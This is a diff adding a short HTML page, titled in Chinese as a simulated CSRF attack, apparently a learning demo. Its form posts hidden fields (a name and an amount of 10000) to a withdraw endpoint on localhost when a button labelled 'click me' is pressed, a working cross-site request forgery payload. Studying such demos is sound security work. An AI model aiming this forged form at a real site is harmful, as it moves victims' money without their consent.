@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>模拟CSRF 跨站请求伪造攻击</title>
+</head>
+<body>
+    <form action="http://localhost:8081/withdraw" method="post">
+        <input name="name" type="hidden" value="bin"/>
+        <input name="money" type="hidden" value="10000"/>
+        <input type="submit" value="点我">
+    </form>
+</body>
+</html>
